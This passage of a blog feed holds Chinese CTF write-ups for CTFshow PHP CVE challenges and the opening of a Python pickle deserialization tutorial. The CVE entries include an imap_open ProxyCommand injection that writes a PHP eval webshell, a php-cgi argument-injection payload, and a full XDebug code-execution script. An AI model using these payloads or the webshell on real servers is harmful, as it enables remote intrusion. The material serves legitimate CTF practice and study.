src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowphpCVE</title>
      <link href="/posts/85a6a528.html"/>
      <url>/posts/85a6a528.html</url>
      
        <content type="html"><![CDATA[<p><strong>311</strong></p><p>PHP版本7.1.33dev</p><p>CVE-2019-11043</p><p><span class="exturl"><a class="exturl__link"   href="https://github.com/neex/phuip-fpizdam" >利用脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>312</strong></p><p>PHP版本5.6.38</p><p>CVE-2018-19518</p><p>漏洞成因</p><blockquote><p>IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数</p><p><code>imap_open( string $mailbox,string $user,string $password）</code></p><p>其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，又因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。</p></blockquote><p>然后对自己想要发的内容进行一次base64编码</p><p>首先对<code>&lt;?php @eval($_POST[kkk]);?&gt;</code>进行一次base64编码</p><p>然后对<code>echo &quot;上个编码内容&quot; | base64 -d &gt;shell.php</code>进行一次base64编码</p><p>注意：如果进行base64编码后，含有+ =，都要进行url编码即%2b %3d，所以为了保证不会出错，最好再对得到的base64编码后的字符串再进行url编码。相当于步骤为先base64编码，再url编码</p><p>然后将hostname的内容替换成<code>x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh&#125;</code></p><pre class="line-numbers language-none"><code class="language-none">hostname&#x3D;x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA&#x3D;&#x3D;|base64%09-d|sh&#125;&amp;username&#x3D;1&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>313</strong></p><p>PHP版本5.4.1</p><p>CVE-2012-1823</p><p>该漏洞具体成因可见<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html" >P神博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>命令行参数不光可以通过<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>的方式传入php-cgi，更可以通过querystring的方式传入。</p><p>通过阅读源码，我发现cgi模式下有如下一些参数可用：</p><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-s</code> 显示文件源码</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul></blockquote><p>简单来说，就可以通过参数传递通过以上的参数类型传入不同的内容在执行php时被传入</p><p>可通过-d直接修改php中的配置项来达到我们任意写入的效果</p><pre class="line-numbers language-none"><code class="language-none">payload:?-d+allow_url_include%&#x3D;on+&#x3D;auto_append_file&#x3D;php:&#x2F;&#x2F;inputPOST:&lt;?php system(&#39;nl &#x2F;somewhere&#x2F;fla9.txt&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>314</strong></p><p>包含日志文件就过了////////////</p><p><strong>315</strong></p><p>PHP版本7.1.12，debug开启，端口9000</p><blockquote><p>影响</p><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：</p><pre class="line-numbers language-none"><code class="language-none">xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个配置下，我们访问<span class="exturl"><a class="exturl__link"   href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82" >http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>编写好的脚本，要在公网IP下使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> socket<span class="token keyword">import</span> base64<span class="token keyword">import</span> binascii<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutorpool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">recv_xml</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>    blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> data <span class="token operator">+</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">while</span> data<span class="token punctuation">:</span>            eop <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> eop <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span>eop<span class="token punctuation">]</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> data<span class="token punctuation">[</span>eop<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>blocks<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">return</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">trigger</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?XDEBUG_SESSION_START=phpstorm'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'XDebug remote debug code execution.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'the code you want to execute.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--target'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target url.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-l'</span><span class="token punctuation">,</span> <span class="token string">'--listen'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'local port'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>listen<span class="token punctuation">)</span>    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>trigger<span class="token punctuation">,</span> args<span class="token punctuation">.</span>target<span class="token punctuation">)</span>    conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'eval -i 1 -- '</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> recv_xml<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Recieve data: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> g<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] No result...'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> g<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Result: '</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] May be not string result...'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境寄了，没得结果</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python pickle反序列化</title>
      <link href="/posts/76010d11.html"/>
      <url>/posts/76010d11.html</url>
      
        <content type="html"><![CDATA[        <h3 id="什么是pickle"   >          <a href="#什么是pickle" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h3>      <p>pickle是Python专用的一个进行序列化和反序列化的工具包，pickle能表示Python几乎所有的类型（包括自定义类型），由一系列opcode组成，模拟了类似堆栈的内存。</p><p>与PHP序列化或者JSON，这些以键值对形式存储序列化对象数据的不同，pickle 序列化（Python独有）是将一个 <code>Python 对象</code>及其所拥有的层次结构变成可以持久化储存的<code>二进制数据</code>，无法像JSON 一样直观阅读。在Python中，采用术语 <code>封存 (pickling)</code>和<code> 解封 (unpickling)</code>来描述序列化。</p>        <h4 id="可序列化的对象"   >          <a href="#可序列化的对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a><strong>可序列化的对象</strong></h4>      <p>节选自官方文档：pickle — Python 对象序列化</p><blockquote><p>None, True, 和False;<br>整数、浮点数、复数；<br>字符串、字节、字节数组；<br>元组、列表、集合和仅包含可提取对象的字典；<br>在模块顶层定义的函数（内置的和用户定义的）（使用def，不是lambda）；<br>在模块顶层定义的类；<br>某些类实例，这些类的 <code>__dict__ </code>属性值或<code> __getstate__()</code> 函数的返回值可以被封存（详情参阅 封存类实例 这一段）。</p></blockquote>        <h4 id="手搓opcode"   >          <a href="#手搓opcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h4>      <p>首先很重要的就是字节码，其实pickle经过了多次迭代已经加了很多内容了，我们直接到源码里去看看</p><p>首先是一个pickle的存储结构</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>_unframer <span class="token operator">=</span> _Unframer<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_file_read<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_file_readline<span class="token punctuation">)</span>self<span class="token punctuation">.</span>read <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readself<span class="token punctuation">.</span>readinto <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readintoself<span class="token punctuation">.</span>readline <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readlineself<span class="token punctuation">.</span>metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">//</span>元栈self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">//</span>栈，默认的操作都是对这个栈进行操作self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>appendself<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是对各字节码的定义</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><span class="token comment"># here is in kind-of alphabetical order of 1-character pickle code.</span><span class="token comment"># pickletools groups them by purpose.</span><span class="token comment"># Pickle的opcodes，可在pickletools.py中查看大范围的文档，在此处列出的内容是按字母顺序排列的单字符pickle code</span><span class="token comment"># 在pickleltools中将这些内容按功能分组了</span><span class="token comment"># 等会再去pickletools里看</span><span class="token comment"># 部分偷的自己师傅的（自己人不算偷）</span>MARK           <span class="token operator">=</span> <span class="token string">b'('</span>   <span class="token comment">#向栈中压入一个Mark标记</span>STOP           <span class="token operator">=</span> <span class="token string">b'.'</span>   <span class="token comment">#相当于停止当前的反序列化过程</span>POP            <span class="token operator">=</span> <span class="token string">b'0'</span>   <span class="token comment">#从栈中pop出一个元素，就是删除栈顶元素</span>POP_MARK       <span class="token operator">=</span> <span class="token string">b'1'</span>   <span class="token comment">#从栈中不断pop元素直到遇到Mark标记</span>DUP            <span class="token operator">=</span> <span class="token string">b'2'</span>   <span class="token comment">#向栈中再压入一个当前的栈顶元素，就是复制一份当前栈顶元素然后进行压栈</span>FLOAT          <span class="token operator">=</span> <span class="token string">b'F'</span>   <span class="token comment">#读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数</span>INT            <span class="token operator">=</span> <span class="token string">b'I'</span>   <span class="token comment">#向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False</span>BININT         <span class="token operator">=</span> <span class="token string">b'J'</span>   <span class="token comment">#从后面的输入中读取4个字节并且使用unpack通过'&lt;i'的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b"(S'a'\nK\x01\x01\x01\x01."</span>BININT1        <span class="token operator">=</span> <span class="token string">b'K'</span>   <span class="token comment">#和上面BININT一样,不过K操作只读取一个字节的数据b"(S'a'\nK\x01."</span>LONG           <span class="token operator">=</span> <span class="token string">b'L'</span>   <span class="token comment">#读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int</span>BININT2        <span class="token operator">=</span> <span class="token string">b'M'</span>   <span class="token comment">#从后面的输入中读取2个字节并且使用unpack通过'&lt;H'的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b"(S'a'\nM\x01\x01."</span>NONE           <span class="token operator">=</span> <span class="token string">b'N'</span>   <span class="token comment">#向栈中压入一个None元素,后面不能换行,直接加下一步的操作b"(S'a'\nN."</span>PERSID         <span class="token operator">=</span> <span class="token string">b'P'</span>   <span class="token comment">#读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效</span>BINPERSID      <span class="token operator">=</span> <span class="token string">b'Q'</span>   <span class="token comment">#和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load...</span>REDUCE         <span class="token operator">=</span> <span class="token string">b'R'</span>   <span class="token comment">#从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args)</span>STRING         <span class="token operator">=</span> <span class="token string">b'S'</span>   <span class="token comment">#向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b"(S'a'\nS''a''\n."</span>BINSTRING      <span class="token operator">=</span> <span class="token string">b'T'</span>   <span class="token comment">#从后面数据读取4字节数据,通过unpack使用&lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b"(S'a'\nT\x10\x00\x00\x000123456789abcdef."</span><span class="token comment"># _struct.unpack('&lt;i', b"\x10\x00\x00\x00") => (16,)</span>SHORT_BINSTRING<span class="token operator">=</span> <span class="token string">b'U'</span>   <span class="token comment">#先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈</span>UNICODE        <span class="token operator">=</span> <span class="token string">b'V'</span>   <span class="token comment">#读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b'V\\u0061\n.'</span>BINUNICODE     <span class="token operator">=</span> <span class="token string">b'X'</span>   <span class="token comment">#读出4字节数据通过unpack使用&lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b'X\x10\x00\x00\x00abcdef0123456789.'</span>APPEND         <span class="token operator">=</span> <span class="token string">b'a'</span>   <span class="token comment">#先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b"]S'h0cksr'\na." => 得到['h0cksr']</span>BUILD          <span class="token operator">=</span> <span class="token string">b'b'</span>   <span class="token comment">#这个操作就是设置元素属性的操作</span>GLOBAL         <span class="token operator">=</span> <span class="token string">b'c'</span>   <span class="token comment"># push self.find_class(modname, name); 2 string args</span>DICT           <span class="token operator">=</span> <span class="token string">b'd'</span>   <span class="token comment"># build a dict from stack items</span>EMPTY_DICT     <span class="token operator">=</span> <span class="token string">b'&#125;'</span>   <span class="token comment"># push empty dict</span>APPENDS        <span class="token operator">=</span> <span class="token string">b'e'</span>   <span class="token comment"># extend list on stack by topmost stack slice</span>GET            <span class="token operator">=</span> <span class="token string">b'g'</span>   <span class="token comment"># push item from memo on stack; index is string arg</span>BINGET         <span class="token operator">=</span> <span class="token string">b'h'</span>   <span class="token comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>INST           <span class="token operator">=</span> <span class="token string">b'i'</span>   <span class="token comment"># build &amp; push class instance</span>LONG_BINGET    <span class="token operator">=</span> <span class="token string">b'j'</span>   <span class="token comment"># push item from memo on stack; index is 4-byte arg</span>LIST           <span class="token operator">=</span> <span class="token string">b'l'</span>   <span class="token comment"># build list from topmost stack items</span>EMPTY_LIST     <span class="token operator">=</span> <span class="token string">b']'</span>   <span class="token comment"># push empty list</span>OBJ            <span class="token operator">=</span> <span class="token string">b'o'</span>   <span class="token comment"># build &amp; push class instance</span>PUT            <span class="token operator">=</span> <span class="token string">b'p'</span>   <span class="token comment"># store stack top in memo; index is string arg</span>BINPUT         <span class="token operator">=</span> <span class="token string">b'q'</span>   <span class="token comment">#   "     "    "   "   " ;   "    " 1-byte arg</span>LONG_BINPUT    <span class="token operator">=</span> <span class="token string">b'r'</span>   <span class="token comment">#   "     "    "   "   " ;   "    " 4-byte arg</span>SETITEM        <span class="token operator">=</span> <span class="token string">b's'</span>   <span class="token comment"># add key+value pair to dict</span>TUPLE          <span class="token operator">=</span> <span class="token string">b't'</span>   <span class="token comment"># build tuple from topmost stack items</span>EMPTY_TUPLE    <span class="token operator">=</span> <span class="token string">b')'</span>   <span class="token comment"># push empty tuple</span>SETITEMS       <span class="token operator">=</span> <span class="token string">b'u'</span>   <span class="token comment"># modify dict by adding topmost key+value pairs</span>BINFLOAT       <span class="token operator">=</span> <span class="token string">b'G'</span>   <span class="token comment"># push float; arg is 8-byte float encoding</span>TRUE           <span class="token operator">=</span> <span class="token string">b'I01\n'</span>  <span class="token comment"># not an opcode; see INT docs in pickletools.py</span>FALSE          <span class="token operator">=</span> <span class="token string">b'I00\n'</span>  <span class="token comment"># not an opcode; see INT docs in pickletools.py</span><span class="token comment"># Protocol 2</span>PROTO          <span class="token operator">=</span> <span class="token string">b'\x80'</span>  <span class="token comment"># identify pickle protocol</span>NEWOBJ         <span class="token operator">=</span> <span class="token string">b'\x81'</span>  <span class="token comment"># build object by applying cls.__new__ to argtuple</span>EXT1           <span class="token operator">=</span> <span class="token string">b'\x82'</span>  <span class="token comment"># push object from extension registry; 1-byte index</span>EXT2           <span class="token operator">=</span> <span class="token string">b'\x83'</span>  <span class="token comment"># ditto, but 2-byte index</span>EXT4           <span class="token operator">=</span> <span class="token string">b'\x84'</span>  <span class="token comment"># ditto, but 4-byte index</span>TUPLE1         <span class="token operator">=</span> <span class="token string">b'\x85'</span>  <span class="token comment"># build 1-tuple from stack top</span>TUPLE2         <span class="token operator">=</span> <span class="token string">b'\x86'</span>  <span class="token comment"># build 2-tuple from two topmost stack items</span>TUPLE3         <span class="token operator">=</span> <span class="token string">b'\x87'</span>  <span class="token comment"># build 3-tuple from three topmost stack items</span>NEWTRUE        <span class="token operator">=</span> <span class="token string">b'\x88'</span>  <span class="token comment"># push True</span>NEWFALSE       <span class="token operator">=</span> <span class="token string">b'\x89'</span>  <span class="token comment"># push False</span>LONG1          <span class="token operator">=</span> <span class="token string">b'\x8a'</span>  <span class="token comment"># push long from &lt; 256 bytes</span>LONG4          <span class="token operator">=</span> <span class="token string">b'\x8b'</span>  <span class="token comment"># push really big long</span>_tuplesize2code <span class="token operator">=</span> <span class="token punctuation">[</span>EMPTY_TUPLE<span class="token punctuation">,</span> TUPLE1<span class="token punctuation">,</span> TUPLE2<span class="token punctuation">,</span> TUPLE3<span class="token punctuation">]</span><span class="token comment"># Protocol 3 (Python 3.x)</span>BINBYTES       <span class="token operator">=</span> <span class="token string">b'B'</span>   <span class="token comment"># push bytes; counted binary string argument</span>SHORT_BINBYTES <span class="token operator">=</span> <span class="token string">b'C'</span>   <span class="token comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span><span class="token comment"># Protocol 4</span>SHORT_BINUNICODE <span class="token operator">=</span> <span class="token string">b'\x8c'</span>  <span class="token comment"># push short string; UTF-8 length &lt; 256 bytes</span>BINUNICODE8      <span class="token operator">=</span> <span class="token string">b'\x8d'</span>  <span class="token comment"># push very long string</span>BINBYTES8        <span class="token operator">=</span> <span class="token string">b'\x8e'</span>  <span class="token comment"># push very long bytes string</span>EMPTY_SET        <span class="token operator">=</span> <span class="token string">b'\x8f'</span>  <span class="token comment"># push empty set on the stack</span>ADDITEMS         <span class="token operator">=</span> <span class="token string">b'\x90'</span>  <span class="token comment"># modify set by adding topmost stack items</span>FROZENSET        <span class="token operator">=</span> <span class="token string">b'\x91'</span>  <span class="token comment"># build frozenset from topmost stack items</span>NEWOBJ_EX        <span class="token operator">=</span> <span class="token string">b'\x92'</span>  <span class="token comment"># like NEWOBJ but work with keyword only arguments</span>STACK_GLOBAL     <span class="token operator">=</span> <span class="token string">b'\x93'</span>  <span class="token comment"># same as GLOBAL but using names on the stacks</span>MEMOIZE          <span class="token operator">=</span> <span class="token string">b'\x94'</span>  <span class="token comment"># store top of the stack in memo</span>FRAME            <span class="token operator">=</span> <span class="token string">b'\x95'</span>  <span class="token comment"># indicate the beginning of a new frame</span><span class="token comment"># Protocol 5</span>BYTEARRAY8       <span class="token operator">=</span> <span class="token string">b'\x96'</span>  <span class="token comment"># push bytearray</span>NEXT_BUFFER      <span class="token operator">=</span> <span class="token string">b'\x97'</span>  <span class="token comment"># push next out-of-band buffer</span>READONLY_BUFFER  <span class="token operator">=</span> <span class="token string">b'\x98'</span>  <span class="token comment"># make top of stack readonly</span><span aria-hidden="true" 